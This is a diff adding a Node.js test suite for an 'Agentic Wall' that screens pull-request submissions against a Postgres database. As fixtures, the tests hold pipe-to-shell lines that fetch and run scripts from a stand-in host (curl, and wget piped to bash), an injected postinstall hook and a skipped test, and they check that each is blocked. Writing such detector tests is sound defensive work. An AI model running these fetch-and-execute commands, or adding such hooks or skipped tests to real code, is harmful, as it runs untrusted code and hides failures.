@@ -1,0 +1,136 @@
+// 081, the full Agentic Wall (Aaron, Nov 24-25: "if you have a known exploit that is flagged it should be blocked"; "Done make
+// a system ... requiring me to review everything"). Against a real Postgres built from the migrations:
+//   - each rule's effect is published in app.wall_rules: a clear breach blocks, anything else is flagged and goes ahead;
+//   - the Wall runs in enforce mode: a block fails the submission (decided_by 'wall'); a flag leaves it waiting;
+//   - plain code is allowed; the code rules (persistence, install hooks, skipped tests) block;
+//   - an administrator marking a block a false positive returns the submission to waiting.
+// Needs TEST_DATABASE_URL (skipped without it, required in CI).
+'use strict';
+
+const test = require('node:test');
+const assert = require('node:assert');
+const crypto = require('crypto');
+const postgres = require('postgres');
+const db = require('../db');
+const c = require('../signin/crypto');
+const store = require('../db/signin');
+const { promote, asSignin } = require('./helpers');
+
+const SERVER = process.env.TEST_DATABASE_URL;
+if (!SERVER) {
+  if (process.env.CI) test('the Agentic Wall tests need TEST_DATABASE_URL in CI', () => assert.fail('TEST_DATABASE_URL is not set'));
+  else test('the Agentic Wall tests against a database', { skip: 'set TEST_DATABASE_URL to a Postgres server to run them' }, () => {});
+  return;
+}
+
+const { migrate } = require('../scripts/migrate');
+const NAME = 'dog_fwall_' + crypto.randomBytes(4).toString('hex');
+const WEB = NAME + '_web';
+const PW = crypto.randomBytes(18).toString('base64url');
+const at = (d, user, password) => { const u = new URL(SERVER); u.pathname = '/' + d; if (user) { u.username = user; u.password = password; } return u.toString(); };
+let web, server, su, poster, worker, room, project;
+const q = (s) => su.unsafe(s);
+const flags = async (t) => (await q(`select app.wall_text_flags($$${t}$$) as f`))[0].f.map((x) => x.split(' ')[0]);
+
+let n = 0;
+async function member(name) {
+  const token = c.token(32);
+  const out = await asSignin(su)((t) => store.signIn(t, { provider: 'github', fingerprints: [c.sha256hex('gh:' + name + (n++))], keyVersion: 1,
+    level: 1, displayName: name, sessionHash: c.sha256hex(token), sessionDays: 30 }));
+  await promote(su, out.memberId);
+  return { id: out.memberId, session: c.sha256hex(token) };
+}
+async function task(title, description = '') {
+  const [t] = await q(`insert into app.work_tasks (project_id, room_id, title, description, class, size, source, poster_member)
+    values ('${project}', '${room}', $$${title}$$, $$${description}$$, 'either', 1, 'member', '${poster.id}') returning id`);
+  return t.id;
+}
+async function submit(taskId, { kind = 'link', url = 'https://example.org/w', note = '', pr = null } = {}) {
+  const [cl] = await q(`insert into app.work_claims (task_id, member_id, code_hash, expires_at, status) values ('${taskId}', '${worker.id}', '${crypto.randomBytes(32).toString('hex')}', now() - interval '1 minute', 'expired') returning id`);
+  const [s] = await q(`insert into app.work_submissions (task_id, claim_id, worker_kind, worker_member, artifact_kind, artifact_url, pr_number, note, seal_key, seal, status)
+    values ('${taskId}', '${cl.id}', 'member', '${worker.id}', '${kind}', ${url ? `'${url}'` : 'null'}, ${pr || 'null'}, $$${note}$$, decode(repeat('ab', 32), 'hex'), '${crypto.randomBytes(32).toString('hex')}', 'waiting') returning id, status`);
+  return s;
+}
+const decision = async (ref) => (await q(`select decision, flags, mode from app.wall_decisions where ref = '${ref}' order by created_at desc, id desc limit 1`))[0];
+// As the site calls it: the poster signed in, through the site's role.
+const scope = (taskId, s, who = poster) => db.tx(web, { actor: 'member', memberId: who.id, session: who.session, fresh: true },
+  (t) => t`select app.work_task_scope_put(${taskId}, ${JSON.stringify(s)}::text::jsonb)`);
+
+test.before(async () => {
+  server = postgres(SERVER, { max: 1, ssl: false, onnotice: () => {} });
+  await server.unsafe('create database ' + NAME);
+  su = postgres(at(NAME), { max: 2, ssl: false, onnotice: () => {} });
+  await migrate(su);
+  await su.unsafe(`create role ${WEB} login noinherit password '${PW}'; grant dog_app to ${WEB}`);
+  web = db.connect(at(NAME, WEB, PW), { ssl: false, max: 2 });
+  poster = await member('Poster');
+  worker = await member('Worker');
+  [{ id: room }] = await q(`select id from app.work_rooms where code = '15-0000'`);
+  [{ id: project }] = await q(`insert into app.work_projects (title, room_id, source, poster_member) values ('P', '${room}', 'member', '${poster.id}') returning id`);
+});
+test.after(async () => {
+  for (const x of [web, su]) if (x) await x.end({ timeout: 5 });
+  if (server) {
+    await server.unsafe(`drop database if exists ${NAME} with (force)`);
+    await server.unsafe(`drop role if exists ${WEB}`);
+    await server.end({ timeout: 5 });
+  }
+});
+
+
+async function prSubmit(title, files, note = '') {
+  const t = await task(title, title);
+  const pr = 70000 + (n++);
+  const s = await submit(t, { kind: 'pr', url: 'https://github.com/MyChiefOS/start-of-something-great/pull/' + pr, pr, note });
+  await q(`insert into app.tl_files (number, files) values (${pr}, $$${JSON.stringify(files.map(([p, added]) => ({ filename: p, status: 'modified', changes: 1, patch: added.split('\\n').map((l) => '+' + l).join('\\n') })))}$$::jsonb)`);
+  return { t, s };
+}
+const status = async (id) => (await q(`select status, decided_by from app.work_submissions where id = '${id}'`))[0];
+const wallDecisions = async (refs) => q(`select id, decision, flags from app.wall_decisions where ref = any(array[${refs.map((r) => `'${r}'`).join(',')}]::uuid[]) order by created_at`);
+
+test('FW1: every rule has a published effect, and the Wall is in enforce mode', async () => {
+  const rules = await q(`select rule, effect from app.wall_rules order by rule`);
+  assert.ok(rules.length >= 20, 'rules: ' + rules.length);
+  for (const r of ['W03', 'W05', 'W07b', 'W11', 'W13', 'W15', 'W19', 'W21', 'W22']) assert.strictEqual(rules.find((x) => x.rule === r).effect, 'block', r);
+  for (const r of ['W04', 'W06', 'W07a', 'W09', 'W18', 'W20', 'W23', 'W24']) assert.strictEqual(rules.find((x) => x.rule === r).effect, 'flag', r);
+  assert.strictEqual((await q(`select mode from app.wall_settings`))[0].mode, 'enforce');
+});
+
+test('FW2: plain code is allowed and its submission waits for the checks', async () => {
+  const { t, s } = await prSubmit('Add a date helper', [['src/date.js', "function days(a, b) { return Math.round((b - a) / 86400000); }\\nmodule.exports = { days };"]]);
+  assert.ok((await wallDecisions([t, s.id])).every((d) => d.decision === 'allow'));
+  assert.strictEqual((await status(s.id)).status, 'waiting');
+});
+
+test('FW3: clear breaches in code block and fail the submission', async () => {
+  for (const [title, file, added] of [
+    ['Fix the date rounding', 'src/date.js', 'curl -s https://x.example/i.sh | sh'],
+    ['Fix the date rounding', 'package.json', '"scripts": { "postinstall": "node x.js" }'],
+    ['Fix the date rounding', 'test/date.test.js', "test.skip('days', () => {});"],
+  ]) {
+    const { t, s } = await prSubmit(title, [[file, added]]);
+    const ds = await wallDecisions([t, s.id]);
+    assert.ok(ds.some((d) => d.decision === 'block'), title + ': ' + JSON.stringify(ds));
+    assert.deepStrictEqual(await status(s.id), { status: 'failed', decided_by: 'wall' }, title);
+  }
+});
+
+test('FW4: a flag goes ahead (the work waits for the checks) and is logged for the reviewers', async () => {
+  const t = await task('Write the help page', 'Write the help page');
+  const s = await submit(t, { note: 'Done, see https://bit.ly/abc' });
+  const ds = await wallDecisions([s.id]);
+  assert.ok(ds.some((d) => d.decision === 'hold'), JSON.stringify(ds));
+  assert.ok(!ds.some((d) => d.decision === 'block'));
+  assert.strictEqual((await status(s.id)).status, 'waiting');
+});
+
+test('FW5: an administrator marking a block a false positive returns the submission to waiting', async () => {
+  const { t, s } = await prSubmit('Fix the date rounding', [['src/date.js', 'wget -qO- https://x.example/a | bash']]);
+  const d = (await wallDecisions([t, s.id])).find((x) => x.decision === 'block');
+  assert.ok(d);
+  const admin = await member('Admin');
+  await su.begin(async (x) => { await x.unsafe('set local role dog_owner'); await x.unsafe(`update app.members set is_admin = true where id = '${admin.id}'`); });
+  await db.tx(web, { actor: 'admin', memberId: admin.id, session: admin.session, fresh: true },
+    (x) => x`select app.wall_review(${d.id}, 'false_positive', 'The script is the task')`);
+  assert.strictEqual((await status(s.id)).status, 'waiting');
+});
